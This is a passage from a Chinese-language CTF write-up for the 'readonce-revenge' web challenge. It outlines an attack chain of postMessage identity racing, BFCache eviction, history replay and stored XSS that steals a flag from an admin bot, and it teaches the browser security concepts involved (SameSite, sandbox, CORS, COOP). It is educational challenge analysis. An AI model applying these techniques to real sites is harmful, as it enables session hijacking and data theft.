# readonce-revenge — sandbox 逃逸 × postMessage 身份竞态 × BFCache 挤出 完整 Writeup

**题目分类：Web 安全（浏览器安全）**。本题考察四种浏览器安全机制的组合利用：iframe 沙箱隔离、postMessage 来源校验、浏览器前进/后退缓存（BFCache）、请求来源声明头（Fetch Metadata）。

核心思路（一段话版本，新手可先跳过、读完前六章再回看）：攻击脚本被沙箱关押着、无法向审查页面证明"自己是外人"——但审查页面在收到消息时会核对寄件窗口的身份（e.source）与它自己小窗里当前的窗口（viewer.contentWindow）是否为同一个；这两个值取自不同时刻，只要消息在"旧页面被销毁前的一瞬"（pagehide 时刻）寄出、拖到"新页面就位后"才被拆读，两值必然对不上——校验被骗过，审查页面替攻击者按下了批准键（approved）。另一边，把浏览器缓存里的旧记录挤掉，再用"后退"让检查请求原样重发（带上只有真用户操作才有的标记），凑齐九个条件，让服务器把预埋的攻击代码当作笔记渲染成网页——代码在挑战网站自己的地盘上执行，读出 flag。

> **诚实声明**：本队独立完成了攻击链的 8/9（挤出链、全条件矩阵、140+ 项封锁验证实验），以及原版 readonce 的完整独立解法。最后一环（pagehide 竞态）在穷尽自有知识后未能独立突破，灵感来自赛后公开的 [stack1245/PwnSec-CTF-2026](https://github.com/stack1245/PwnSec-CTF-2026) 仓库 writeup；拿到灵感后，机制的验证实验与完整 exploit 均为本队自行实现（挤出链采用了与该 writeup 不同的自有方案）。本文将失败过程完整记录，因为"为什么 140 个实验都没找到这最后一环"本身就是最有价值的教训。

## 第一章：前置知识——五个必须先理解的概念

这一章是全文的地基：整道题的每道防线都建立在这五个浏览器安全机制上，后面九章的每一个推理都会回头引用它们。章内结构：先认识参与者（角色地图）→ 1.0 节把整场攻击从头到尾过一遍（过程概览）→ 1.1~1.5 讲五个安全机制。

**先认识本题的三位参与者**（全文的角色地图——后面所有"谁在做事"都指这三家，第一次出现就用名字不再解释，请在这里认全）：

- **选手/攻击者（你）**：用浏览器访问题目网站的人。只有**普通权限**——能创建笔记、提交审查（后文会讲这两个功能），**永远看不到 flag**（flag = CTF 题的最终答案，一串形如 `pwnsec{...}` 的密码文字，拿到即通关——本题 flag 只有 admin 能看）。攻击者的武器只有一台：自己控制的服务器——上面放着一个网站，存放你的攻击页面（这个网站所在的域名，下文叫"攻击者域"）。
- **机器人（= admin = bot，三个词指同一个东西）**：出题人**用程序自动控制的一个 Chrome 浏览器**（控制它的程序叫 puppeteer，2.2 节详细看它的工作流程）。它事先登录着网站的 **admin 账号**（管理员账号，权限最高、唯一能看 flag）——"机器人"强调它是程序不是人，"bot"是它的英文名，"admin"是它登录的账号名，**全文这三个词混着用，都指它**。它存在的意义（也是这类题的固定套路）：你提交审查后，它会访问你指定的网址——你的攻击代码由此在**它的浏览器里**运行。攻击代码自己运行不需要任何权限；它真正需要的是**这台浏览器后续发出的每个请求都会自动带上 admin 登录凭证**（ Cookie 机制，1.1 详讲）——而 admin 凭证只存在于机器人的浏览器里。
- **机器人的会话**（提前解释，1.1 马上正式讲 Cookie）：机器人登录 admin 账号后，服务器发给它一个登录凭证——一串存在它浏览器里的数据（`connect.sid=xxx`，术语叫"会话 Cookie"）。**"机器人的会话"四个字，全文指的就是这个凭证**：谁持有它，服务器就把谁当 admin。
- **挑战服务器**：题目网站的本体，跑在 Docker 容器里（7.1 讲怎么搭），所有防线和"九道门"（服务器在审查流程上设的九个必须同时满足的条件，2.3 逐个列出）都写在它的代码里。

### 1.0 攻击全过程概览（先读这一节，后面所有章节都是展开其中某一步）

先明确两个词，后文反复用：

- **被攻击页面** = 挑战服务器上的网页（攻击的最终目标在那里执行）
- **攻击页面** = 你放在自己服务器上的网页（它的作用是第 3、4 步的"操纵者"，它本身碰不到被攻击页面——浏览器的安全机制禁止一个网站的页面直接操作另一个网站的页面）

#### 第 1 步：准备——创建笔记、提交审查（你在自己的浏览器里操作，普通权限即可）

做两件事：

- **创建笔记**。笔记内容不是自然语言文章，而是一段 **HTML 代码**（题目允许最长 128 字节），里面写着你的攻击代码。创建成功后，这段内容**存储在挑战服务器的数据库里**，后续不再需要传输它。
- **提交审查**。表单里有两个独立字段：
  - **笔记编号**（就是数据库里这篇笔记的身份号：创建成功时服务器分配的）
  - **一个网址**（指向你服务器上的攻击页面）
  - 服务器收到后建立一条审查记录（术语 currentReview，2.1 名词表详讲），登记笔记编号和网址，并生成两个随机值：
    - **报告编号 rid**——标识"这是哪一轮审查"（第 4 步讲它的用法）
    - **128 位随机暗号 nonce**——去向：拼进机器人流程的①（访问 check 页，见第 2 步）所用网址的参数里，网址长这样 `/reports/check?rid=报告编号&state=暗号`；同时服务器在审查记录里也存一份。之后**任何**对 check 页的访问，服务器都会核对"网址里的 state 参数值，是否等于记录里存的暗号"——对不上就当伪造拒绝（第 4 步讲攻击怎么过这一关）

注意：**网址是独立字段，不在笔记里；后续没人会解析笔记内容**。

#### 第 2 步：机器人执行固定流程（题目程序写死的四件事，每件都带着 admin 登录状态发出）

这四件事在全文里的引用格式统一是"机器人流程的①/②/③/④"：

- **① 访问题目网站的 check 页**——这是对 check 的**第一次访问**：服务器在审查记录里记下"已访问过"（visited=true），**这次响应里没有笔记内容**
- **② 访问 flag 页**——flag 被存进这条审查记录（第 5 步的代码读的就是它）
- **③ 调用"就绪"接口**（附只有机器人知道的口令）——记录里标记 prepared=true
- **④ 访问你提交的那个网址**（网址后附上 rid 参数）——你的攻击页面在机器人的浏览器里加载、运行。之后机器人保持浏览器打开约 10 秒

#### 第 3 步：攻击页面运行

注意：它此刻只是个普通网页，**加载和运行都不需要、也没有用到 admin 权限**。它从网址参数里读到 rid，于是知道服务器上存在这轮审查。它盘点的局面：

- 审查记录的九个条件中，八个已由机器人流程的①②③（见第 2 步）备好
- **唯一缺的是"对 check 页的第二次访问"**——而你的笔记在数据库里等着这次访问发生时被取出

#### 第 4 步：操纵这台浏览器，发出对 check 页的第二次访问

先回答"为什么整个过程必须发生在机器人的浏览器里"：

- 这次访问请求必须**带着 admin 登录凭证**才过得了权限检查，而凭证（会话 Cookie，1.1 详讲）**只存在机器人的浏览器里**
- 你的浏览器没登录 admin，从你这边发什么请求都过不了权限这关
- 攻击页面自己直接向服务器发请求也不行（它手里没有这份 Cookie）
- 唯一可行的路径：**让攻击页面所在的这台浏览器去访问 check 页**——这台浏览器发出的请求会自动带上 admin 凭证

这次访问要通过检查，还必须同时凑齐两样东西：

- **网址里带正确的 rid 和暗号**
  - rid 的作用是"报名字"：服务器收到对 check 页的访问时，先读网址里的 rid 参数，**按这个编号找到那条审查记录**（第 1 步立的 currentReview），接下来九个条件的检查全部针对这条记录
  - 暗号的核对：网址里的 state 参数值必须**等于这条记录里存的暗号**（不是"rid 和暗号互相一致"，而是**两个值分别与记录里存的对应值比对**）——等于才认你是这轮审查的合法当事人，不等于按伪造拒绝
  - 攻击者不知道暗号的值，但**不需要知道**：机器人流程的①访问 check 用过的完整网址（连暗号一起）留在这台浏览器的历史记录里，第四章的做法是让浏览器**原样重发这个旧网址**——暗号随网址自动带上、核对自然通过（这叫"历史回放"）
- **请求头带 `Sec-Fetch-Site: none`**
  - 每个请求都带一个浏览器自动贴的"来路标签"（就是请求头，1.5 详讲）——**由浏览器填写，JavaScript 无法设置也无法伪造**
  - 标签的值取决于请求怎么产生：用户在地址栏输入网址、点书签、按后退键 → 标签值是 `none`；网页代码发起的跳转（`location.href=...`）→ 标签值是 `same-origin` 或 `cross-site`
  - 服务器要求这次访问的标签必须是 `none`，翻译成人话：**"这次访问必须像用户亲手操作，不能是网页代码发起的跳转"**
  - 攻击页面用代码跳转（location.href）时标签永远是 same-origin，必被拒；唯一例外：**用代码调用 `history.go()` / `history.back()`（效果等同于按后退键）触发的访问，浏览器按"用户操作"对待、贴 `none`**——第四章的历史回放正是靠它（还差一个前提：目标页若还在 BFCache 里，按后退只会解冻缓存、**不发请求**、标签无从谈起——所以第四章还要先把缓存"挤出"，细节届时展开）

#### 第 5 步：九个条件全过——两件事自动发生（攻击者不需要再下任何指令）

- **服务器把笔记内容嵌进响应网页**
  - 为什么"取出笔记"？——不是攻击者命令服务器取的，这是**题目网站自己写死的功能逻辑**：check 页的第二次访问本来就是"审查结果页"，九个条件全过时，服务器的响应模板就是"把这轮审查关联的那篇笔记内容显示出来"（题目业务上的正常设计）
  - 问题出在它嵌入时**不加转义**（术语"不转义渲染"，3.3 详讲：你笔记里写的 `<img>` 标签会被浏览器当成真实的网页标签解析执行，而不是当文字显示）——这正是整道题埋的漏洞点
- **浏览器渲染响应，你的代码开始执行**
  - 机器人不是"主动打开了笔记页"——第 4 步的第二次访问是一个**整页导航**（攻击页面把这台浏览器从自己跳到 check 网址），导航到达后浏览器渲染服务器返回的 HTML 是**导航的必然部分**，无人可以阻止
  - 于是你的攻击代码运行在题目网站的域名下，它发出的任何请求都自动带 admin 凭证，读出 flag

第 5 步的两个常见疑问，先在这里解决（后面章节不再展开）：

- **为什么第一次访问不渲染笔记？** 服务器代码写死的分支：`if (已访问过) { 检查九个条件并渲染笔记 } else { 只标记"已访问过"，返回一个不含笔记的普通页面 }`——**出题人的刻意设计**。你可能会想"第一次就渲染该多省事"——完全正确，但正因如此不行：机器人流程的①就是第一次访问，如果那次就渲染，机器人自己就引爆了你的代码（带着 admin 身份），你只需要"提交审查"就赢，这道题就不存在了。把引爆点推迟到"第二次访问"、再在第二次访问上堆九道门（真人操作标记、已就绪、批准、暗号、一次性……），全部难度由此而来
- **笔记是通过 iframe 加载的吗？有同源问题吗？** 都不是。笔记内容是服务器**直接拼进 check 响应页自己的 HTML 里的**（模板写法 `<%- note.html %>`，2.3 的代码里能看到）——渲染出来的这个页面本身就是题目网站的一个普通页面，笔记代码不是"装在某个框里的外部内容"，而是**页面本体的一部分**：它的身份就是这个页面自己的身份（题目网站的域名 + 机器人的 admin 凭证），没有 iframe、没有跨源问题。这正是这类攻击（XSS）的核心特征：不是把代码"加载进来"，而是让代码"变成页面本身"

#### 第 6 步：外传 flag

把 flag 拼进一个跳转网址（指向你自己的服务器），你的服务器收到并打印——通关。

六步压缩成一句话：**攻击页面在机器人的浏览器里运行 → 操纵这台浏览器对 check 页发出带 admin 凭证且通过全部检查的第二次访问 → 服务器把笔记渲染成网页 → 笔记里的代码以 admin 身份读出 flag 并外传**。

### 1.1 SameSite=Lax Cookie：什么时候"带上身份"

先解释三个基础词，它们贯穿全文：

- **Cookie 与"带"**：你登录 bank.com 后，浏览器会在本机存一个小文件（Cookie，如 `sid=xxx`）作为你的登录凭证。之后**浏览器每次向 bank.com 发请求时**，可以自动把这个 Cookie 附在请求头里一起发过去——服务器看到它就知道"这是已登录的张三"。所谓"带不带 Cookie"，指的就是**浏览器发请求时附不附这个凭证**。
- **顶级导航 vs 子请求**：你在浏览器里点链接、输网址、点后退键，导致**整个页面跳转到新网址**——这叫"顶级导航"（就是"开一个新网页"的意思）。与之相对，网页打开后内部偷偷发出的请求（加载图片 `<img>`、加载脚本 `<script src>`、用 `fetch()` 取数据）叫"子请求"——它们不换页面，是页面的"配角动作"。
- **SameSite=Lax 是什么**：`SameSite` 是服务器给 Cookie 设置的一个属性，控制"从**别的网站**发起的请求，浏览器还带不带这个 Cookie"。它有三档——`Strict`（最严：只要当前页面不是 bank.com 自己，任何发往 bank.com 的请求都不带）、`Lax`（**宽松档，中间值：子请求不带，但"整页跳转到 bank.com"这种顶级导航照带**）、`None`（不限制）。Lax 是如今浏览器的默认推荐档，本题挑战用的就是它。

把这三条放在一起，就得到 Lax 的完整行为表。设问：你在 bank.com 登录了（浏览器存下 Cookie `sid=xxx`，SameSite=Lax），下面每种情况下，**浏览器发往 bank.com 的请求**会带 Cookie 吗？

| 你正在做什么 | 浏览器发出的请求 | 带 Cookie 吗 |
|---|---|---|
| 在地址栏输入 bank.com 回车 | 整页打开 bank.com（顶级导航） | ✅ 带 |
| 在 google.com 的页面上点了一个指向 bank.com 的链接 | 整页跳转到 bank.com（顶级导航） | ✅ 带 ← Lax 的"宽"处：跨站来的整页跳转也带 |
| bank.com 自己页面里的 fetch() / img | bank.com 页面的内部子请求 | ✅ 带（这本来就是同站） |
| evil.com 页面里写 `fetch("bank.com")` | 从别的网站发的子请求 | ❌ 不带 ← Lax 的"严"处 |
| evil.com 页面里 `<img src="bank.com/...">` | 同上（子请求） | ❌ 不带 |
| 在 evil.com 页面点按钮提交表单、表单目标设为 bank.com（POST 提交） | 整页跳转到 bank.com，但这次是跨站的 POST 表单提交 | ❌ 不带（Lax 的放宽只覆盖 **GET 方式**的整页打开；POST 方式的整页跳转不在放宽范围） |

> 注："同源"= 协议+域名+端口三者完全相同（如 `http://a.com:80` 的页面请求 `http://a.com:80/x`）。"跨站"= 域名不同（evil.com 的页面发请求给 bank.com）。

本题的关键推论：**机器人用"整页打开"的方式访问挑战网站的任何页面时，它浏览器里存的 admin 会话 Cookie（SameSite=Lax——就是开头参与者地图里说的那个"机器人的会话"凭证）都会被自动带上**——所以攻击者只要能让机器人的浏览器"整页打开"某个页面，那个页面就以 admin 身份运行。这决定了我们后面能借用机器人的浏览器去打开需要 admin 权限的页面。

> **冷知识（机制来源 + 本题实测确认）**：Chrome 对**创建后 2 分钟内**的 Cookie 有一个"Lax 宽限期"（官方名 Lax-allowing-unsafe）：Cookie 刚生成的 2 分钟里，连"跨站的 POST 表单提交"也会带上它。
> - **这是 Chrome 2020 年的公开设计，不是我们的发现**：当年 Chrome 把 Cookie 默认值从"不限制"改成 Lax，为了不弄断海量网站"登录表单跨站 POST → 服务器种 Cookie → 跳转"的既有登录流，给新 Cookie 留了 2 分钟豁免——用一个短时间窗换取全互联网 CSRF 防御的巨大提升，Chrome 认为净收益为正（对敏感操作的根治手段始终是 CSRF token，不指望 SameSite）。
> - **我们的实测贡献**：官方文献记载该豁免适用于"**未显式声明** SameSite"的 Cookie，不少资料据此认为显式写明 `SameSite=Lax` 的 Cookie 不享受宽限。我们实测（合成实验 + 真实挑战服务器日志出现 `admin=true`）确认 **Chrome 152 对显式声明的 Lax 同样生效**——机器人的会话 Cookie（地图里说的那个 admin 登录凭证）创建后几秒内就是攻击窗口：攻击者页面直接跨站 POST 即可携带 admin 身份（本题最终解法没用到它，但值得记住：版本 152 为实测版本，与远程 bot 的 UA 一致）。

### 1.2 iframe sandbox 与 opaque origin：被关进玻璃房的脚本

这一节信息量大，按四步走：先懂 iframe，再懂"源"（浏览器的身份制度），然后看 sandbox 干了什么，最后看后果。

**第一步：iframe 是什么。** 一个网页可以用 `<iframe>` 标签在页面里嵌一个小窗口，窗口里装**另一个**网页（可以是自己网站的，也可以是别的网站的）。本题的 review 页面（挑战网站的"审查页面"，后面 2.4 节细讲）就嵌了一个 iframe 装沙箱页。带 `sandbox` 属性的 iframe 是特殊款：

```html
<iframe sandbox="allow-scripts" src="/sandbox"></iframe>
```

`sandbox="allow-scripts"` 的意思：**小窗口里的页面被"降级关押"**——只保留一项权利（allow-scripts：允许运行 JavaScript），其余全部剥夺：不能开新窗口、不能填表单提交、不能让整个标签页跳转到别的网址……下面讲被剥夺的最重要一项：身份。

**第二步：先懂"源"（origin），才能懂剥夺了什么。** 浏览器给每个网页发一张**身份证**，内容是三样：协议 + 域名 + 端口（如 `http://challenge.com:80`）。网页里的代码可以用 `window.origin` 这行代码查自己的身份证号——正常网页都返回自己的真实地址。

身份证（同源策略）这把尺子**具体管什么、不管什么**，必须分三层记住，很多混乱都来自把三层混成一句"看不见"：

**第一层：发请求——门卫不管。** 任何网页都能向任何网址发请求，跨源也照发，服务器照常收到。（evil.com 的页面 `fetch("bank.com/api")`：请求发出去了，bank.com 服务器也收到了——CSRF 攻击钻的就是这个空子。）

**第二层：JS 读取响应的内容——门卫管。** 默认只有同源时，JS 才拿得到响应内容；跨源要拿到，必须对方服务器用 CORS 头明确授权。举例：还是上面那条 `fetch("bank.com/api")`——请求发出了、服务器也回了，但没配 CORS 时 evil.com 的 JS 就是**读不到**返回的数据。而你平时见过的"跨站也能调公开 API"，其实是对方配了 `Access-Control-Allow-Origin: *` 主动开门——门卫一直都在，只是有人主动开了门。

**第三层：页面之间互访（iframe 内外、弹窗互操作对方的变量和页面内容）——门卫管，且最严。** 必须同源，**连 CORS 都救不了**。举例：跨源的 iframe——外面的页面读不到里面的 `document`（页面内容对象），反过来也一样。

> 顺带分清两把尺子：**同源**=协议+域名+端口完全相同（管上面第二、三层的门）；**同站**=注册域相同（`a.bank.com` 与 `b.bank.com` 同站但**不同源**；1.1 讲 Cookie 的 SameSite 属性用的就是"站"这把尺——两个概念并存，别混）。

**第三步：sandbox 干了什么。** 被 `sandbox`（且没给 `allow-same-origin` 权限）关押的 iframe 里的页面，运行 `window.origin` 查身份证时会得到：

```javascript
window.origin   // 返回 "null"——身份证被没收，成了"无国籍页面"
```

这就是 **opaque origin（不透明源）**：sandbox 把小窗口里页面的身份证没收了。**即使它加载的明明是挑战网站自己的页面，浏览器也把它当作"来历不明的无国籍户"**——它和**任何**网站（包括装它的那个页面）都不同源。就像被关进一座玻璃房：里面的人能看到外面（页面照常渲染、脚本能算东西），但玻璃房没有地址——他跟谁都"不同区"，谁也敲不开他的门，他也敲不开别人的门。

**第四步：无国籍的三个具体后果**（后面每一章都在用）。读完四步主线后，下面还有两段"深入追问"（CORS 与令牌的关系、sandbox 全令牌表），依赖前四步的概念，供需要时查阅：

1. **它读不了"没给它开门"的服务器**：它发的 `fetch()` 请求照发、服务器照收照回（第一层不管），但读不读得到响应内容走第二层规则——目标服务器若没配 CORS 授权（本题挑战网站就是），浏览器不许它读；若对方配了 `Access-Control-Allow-Origin: *`（公开 API 常见），无国籍页面**也照样能读**——所以准确说法是"读不了没开门的服务器"，不是绝对失明。
   补充服务器"开门"的两种写法：①通配符 `*`（任何来源都能读，公开 API 常用）；②**白名单回显**——服务器只允许指定网站读：浏览器发请求时自动带上 `Origin: https://friend.com`（我的身份证），服务器核对白名单后把核对通过的来源**抄写回**响应头（`Access-Control-Allow-Origin: https://friend.com`），浏览器比对一致才放行。无国籍页面进不了第二种门（白名单回显）：它带的 Origin 是字面量 `null`，而白名单里登记的都是真实域名，没人登记 `null`——服务器无东西可回显。（警告：有些运维图省事，遇到 null 报错就直接配 `Access-Control-Allow-Origin: null`"解决"——这等于对全世界所有沙箱页面开门，是真实的漏洞配置模式。）
2. **它和别人互相读不了对方（第三层禁令是双向的，父页面也不例外）**：外面的任何页面（首当其冲就是装它的**父页面**——关系最近的"外面人"）都访问不了它的内容和变量；反过来它也读不到外面。本题两个方向都踩到了（这里提前用两个本题名词，先认识一下：**review** = 挑战网站的"审查页面"，就是那个嵌着 viewer 小窗口的父页面，2.4 节逐行精读；**S2** = 我们注入的攻击脚本，部署在自己服务器上、被题目的 `?u=` 参数机制塞进 viewer 沙箱里运行——命名来自攻击的第二个阶段 stage-2）：
   - review（父页面）读不到 S2 的内部。展开说：review 页面上的脚本是**出题人预先写死的**（存放在服务器上的模板文件 review.ejs 里，内容固定、我们改不了它一个字）——而这段写死的脚本里**没有任何一行代码去尝试读取 S2 的内容**，所以"父读不到子"这个限制对攻击既没帮助也没妨碍，此处只需知道它存在；
   - **S2 也读不到 review 的变量——而 nonce（暗号，2.2 节讲它怎么用）恰恰就存在 review 页面的 JS 变量 `report` 里**！S2 隔着玻璃"看得见"父页面存在，却读不走里面的暗号。这句话为什么重要？把整条因果链摆出来：后文（第三章）会推演出——想拿到 flag 必须把服务器上的 approved 开关打开（approved 是什么、为什么必须开，第三章详述）；打开它只有一个办法：向服务器的 /complete 接口发请求；而这个请求必须附带 nonce 才会被受理；nonce 全世界只有 review 页面自己知道（S2 读不走、攻击者更不知道）。**所以攻击者永远不可能"自己"发这个请求——唯一的出路是：想办法让 review 页面自己的代码替我们发**（它的消息监听器正好是干这个的——收到合格的消息就发）。整道题最后归结为"给 review 发一条合格的消息"，根源就在这里。出题人敢把 nonce 放在 review 页面里而不担心被偷，靠的也正是沙箱这层玻璃（这就是所谓"底气"）。
3. **它的孩子也是无国籍**：它里面再嵌 iframe，子 iframe 继承关押状态，也拿"null"身份证——而且**每个 sandbox 页面的 null 身份证互相不等**（无国籍户 A 和无国籍户 B 也算不同区），所以连沙箱父子之间也互相不可读。

**常见追问：CORS 和这套门卫是什么关系？有没有"令牌"能开第三层的门？**
- CORS **不是**与同源策略平行的另一套系统——它是**服务器递给浏览器的授权书**（响应头里写"我允许某身份证的页面读我的内容"），浏览器**收到授权书后**才在第二层放行。所有门的最终执行者始终是浏览器，服务器强制不了任何事。
- 第二层：有授权书（CORS）就能开。
- 第三层（直接操作对方 DOM）：**没有任何令牌/响应头能开**。历史上唯一例外 `document.domain`（同站双方页面主动声明同一父域可互访）因安全问题已被 Chrome 废弃移除。
- 跨源页面想**通信**只有一条正道：`postMessage`——不碰对方 DOM，只发消息，**对方页面自己的代码**决定听不听、怎么处理（前提：你手里还握着对方窗口的**有效引用**——sandbox 和同源策略都不没收引用，所以隔着玻璃的双方仍能寄信；但 1.3 的 COOP 会把引用本身折断，那种情况下连 postMessage 都是空调用）。这正是本题防线的由来（见 1.4 与第二章）：因为不能直接操作 DOM，题目作者才搭了"postMessage + 寄件人身份校验 + 由 review 页面自己代为执行"的批准机制——我们攻的就是这个替代通道的身份校验。

**再一个常见追问：给 sandbox 加 `allow-same-origin` 令牌不就恢复身份了？——它不是"跨源互访令牌"，而是"不没收真实身份"。**
- iframe 内容**本来就和父页面同源**（`a.com` 嵌 `a.com/x`）：加它 → 保留 `a.com` 身份证 → 父子同源，可互访 DOM ✅
- iframe 内容是**跨源页面**（`a.com` 嵌 `evil.com`）：加它只是保留 evil.com 的真实身份——和 a.com 本来就不同源，照样互访不了 ❌
- **本题为什么故意不给它**：先定义一个全文通用的词——**"挑战域"= 挑战网站自己的域名**（也就是题目服务器所在的网址，如 `http://challenge.com:3000`；与之相对，evil.com 是攻击者自己的地盘，叫"攻击者域"）。viewer 里的 /sandbox 页和 review 页**都从挑战域加载、本来是同源的**——一旦给了 allow-same-origin，S2（攻击者脚本）就保有挑战域身份证 → 与 review 同源 → 直接 `parent.document` 读走 nonce、直接替 review 发请求，题目秒破。所以 `sandbox="allow-scripts"` 单令牌就是故意把 S2 关成无国籍。这个事实写成一句后文（1.3）会直接引用的封死结论：**攻击者脚本 S2 永远不可能"在挑战域上执行"**——它哪怕加载的是挑战域自己的 /sandbox 页面、跑在挑战的服务器旁边，浏览器发给它的身份证也永远是"无国籍"（opaque），它拿不到"挑战域脚本"的身份。

**sandbox 全部令牌速查表**（属性里不写的令牌=对应能力被禁止）：

| 令牌 | 解禁什么 | 与本题的关系 |
|------|---------|------------|
| `allow-scripts` | 运行 JavaScript | **本题唯一给的**（S2 能跑全靠它） |
| `allow-same-origin` | 保留真实身份证（见上） | 故意不给——给了就破题 |
| `allow-forms` | 填表单并提交（向服务器发 POST 请求的经典方式） | 没给 → S2 填不了也交不了任何表单。这一缺还顺手焊死了原版解法的一环（原版靠"表单提交"绕过 CSP 对 fetch 的禁令，见 3.5） |
| `allow-popups` | `window.open` 弹窗 | S2 开不了弹窗的原因（第五章方向 B 全灭的根源之一） |
| `allow-popups-to-escape-sandbox` | 弹出的新窗口脱离沙箱 | |
| `allow-top-navigation` | 让**整个标签页**（不只是页面里嵌的小窗）跳转到别的网址 | 没给 → S2 无法让主标签页跳转 |
| `allow-top-navigation-by-user-activation` | 同上，但放宽一点：当用户在这个页面上**真的点过鼠标/按过键盘**之后，允许由那次操作引发整页跳转（纯程序的自动跳转仍然禁止） | 本题无关 |
| `allow-modals` | 弹出 alert/confirm/prompt 提示框（就是那种只显示几行字、等你点"确定"的小框） | 没给 → S2 调 alert() 会被浏览器直接忽略 |
| `allow-downloads` | 触发文件下载 | 本题无关 |
| `allow-pointer-lock` / `allow-orientation-lock` / `allow-presentation` | 鼠标锁定 / 锁屏幕方向 / 投屏 | 本题无关 |
| `allow-storage-access-by-user-activation` | 用户操作后，请求读取它在"第一方场景"（直接访问时）才能读的存储数据（Storage Access API） | 本题无关 |

> 高危组合警告（CSP 规范明文）：`allow-scripts` + `allow-same-origin` 同给、且 iframe 内容与父页面同源时——脚本既能执行又保有同源身份，可以**摘掉自己 iframe 的 sandbox 属性再重载**，沙箱形同虚设。这对组合不该出现在同源场景。

> CSP（Content Security Policy，内容安全策略） 是一种浏览器安全机制，用来限制页面能加载和执行哪些资源，主要目的是防御 XSS（跨站脚本攻击） 和 数据注入 等攻击。

**最后一块拼图：CSP 响应头版 sandbox。** "响应头"是服务器随网页附带下发的说明标签（一页纸的备注栏）。服务器可以在备注栏里写 `Content-Security-Policy: sandbox allow-scripts`，效果和 iframe 的 sandbox 属性一模一样——但**作用范围更广**：iframe 版的 sandbox 属性是写在标签上的，只管"被装进 iframe 的页面"（没装进 iframe 的页面身上根本没地方写这个属性）；响应头版跟着网页本身走，**不管页面用什么方式打开都生效**。

上一段出现了"iframe 里、弹窗里、直接打开"三种打开方式，这里把两个容易混淆的词说清楚（全文反复用）：

- **"直接打开"（= 顶层窗口打开）**：指这个页面就是标签页的主体——你在地址栏输入网址回车打开、或点一个普通链接整页跳过去，都算"直接打开"。与之相对：iframe 是"网页里嵌的小网页"，弹窗是"另开的新窗口"。
- **"弹窗"**：指 JavaScript 调 `window.open()` 弹出的**新浏览器窗口**——它是货真价实的窗口，里面能加载一个完整网页（1.3 节详讲）。**不是** alert() 那种只能显示几行文字、点"确定"关掉的提示框——提示框确实加载不了页面，但那不是我们说的"弹窗"，两个词撞名纯属历史误会。

再解释本段话里出现的两个版本名词：本题全名 **readonce-revenge**（revenge 直译"复仇版"）。它是出题人早先一道题 **readonce**（后文统称"原版"）的加强版——原版在比赛中被选手解出后，出题人把原解法堵上重新发布，就有了这道 revenge。本题 revenge 版正是用"响应头版 sandbox"这一点封死了原版解法：不管攻击者把 /sandbox 页面装在 iframe 里、弹窗里还是直接打开，它一律无国籍（原版与 revenge 的四处具体差异见 3.5 节，这条封锁如何挡住我们见 5.2 节）。

### 1.3 COOP：为什么弹窗会"翻脸不认人"

COOP（全称 Cross-Origin-Opener-Policy，"跨源开窗人策略"）是服务器在响应头（就是 1.2 说过的"随网页下发的备注栏"）里写的一条规矩，管的是**弹窗关系**。

先解释两个词：

- **opener（开窗人）**：A 页面调用 `window.open()` 弹出 B 窗口时，A 就是 B 的 opener——浏览器会给 B 留一个"开窗人是谁"的记录（`window.opener`），同时 A 手里也握着 B 的遥控器（`window.open` 的返回值），两边可以互相发消息、互相操作。
- **BCG（浏览上下文组）**：可以理解为浏览器给"互相认识的窗口"分的小组——同一个小组里的窗口才能互相遥控。跨组的遥控器全部失效。

COOP 不是"有/无"的开关，而是**分档位的**（和 1.1 的 SameSite 三档一个思路）：响应头里填什么值，就是选了什么档。分组的判定**不只看 B 的档位，还看 A 的档位**——两边凑在一起才决定"断还是不断"。把三种档位两两组合（依据 MDN 的官方矩阵），提炼成三条最容易混的规则：

- **A 没设 COOP（默认 unsafe-none）开的弹窗 B**：B 也没设 → 同组；B 设了任何一档（allow-popups / same-origin）→ **断**（B 嫌弃 A 没设防护）。
- **A 带 `same-origin` 档（最挑剔——本题挑战的所有页面就是这档）开的弹窗 B**：B 必须"和 A 同源、**且 B 自己也带 same-origin 档**"才同组（同源但 B 带的是别的档 → 断；同源但 B 没设 COOP → 也断——严格档连不设防的同源弹窗都嫌弃，一视同仁地断）。
- **A 带 `same-origin-allow-popups` 档（放宽档）开的弹窗 B**：B 没设 COOP（unsafe-none）→ **同组，哪怕 B 和 A 跨站**！B 同源且 B 也带 allow-popups 档（档位字面一样）→ 同组；B 同源但带的是 same-origin 档 → **断**（档不同不算"同档"，两边互相嫌弃）；其余 → 断。这档就是为 OAuth/支付这类"我需要跨源开窗并保留遥控"的场景发明的。

三条规则浓缩成一张直观对照表（**不用推理，直接查表**。设 A 是开窗人、B 是它 window.open 出来的弹窗，"普通页"= 没设 COOP 的 unsafe-none 页面）：

| A 开的弹窗 B 是…… | A 带 same-origin 档 | A 带 allow-popups 档 |
|---|---|---|
| 普通页（没设 COOP，不管同源跨站） | ❌ 断 | ✅ **同组（跨站都留）** ← 两档唯一的实质区别 |
| 同源 + 档位字面相同（跟 A 一致） | ✅ 同组 | ✅ 同组 |
| 同源 + 档位不同（一个 same-origin 一个 allow-popups） | ❌ 断 | ❌ 断 |
| 跨站 + 设了任何档 | ❌ 断 | ❌ 断 |

一句口诀记区别：**same-origin 是"洁癖档"——除了"同源且同档"的，谁进我的组都断（包括自家不设防的弹窗）；allow-popups 是"洁癖但宠自己开的娃"——别的规矩照旧，唯独我亲手开的普通弹窗可以留（跨站也留，OAuth/支付就靠这格）**。"被别人开"的方向两档一样挑剔：都要求开窗人"同源且同档"才不断。


再划清管辖范围（读 1.2 学过 iframe 的读者一定会问）："分组"只对**顶层窗口**（标签页本身、window.open 弹出的窗口）有意义——iframe 是嵌在别人页面里的小窗，**不自己成立分组单位**，永远跟着装它的那个标签页的组走。所以"B 页面被 iframe 嵌入时，B 的 COOP 头有没有用"——就"被嵌入"这件事本身：**没用**（既不阻止被嵌、也不产生任何隔离效果）。iframe 场景各有各的管事者：阻止"被别人嵌"的是 `X-Frame-Options` / CSP `frame-ancestors`（本题 /sandbox 就带 `frame-ancestors 'self'`，见 3.5 的 diff）；跨源 iframe 和父页面互不可读是同源策略第三层（1.2）；本题对 viewer 的额外关押是 sandbox 属性。B 的 COOP 唯一仍生效的场合：iframe 里的 B 自己再 `window.open()` 开新弹窗时，B 作为开窗人的档位参与那个新弹窗的分组判定（5.6 发现一踩的就是这个场景的细则）。


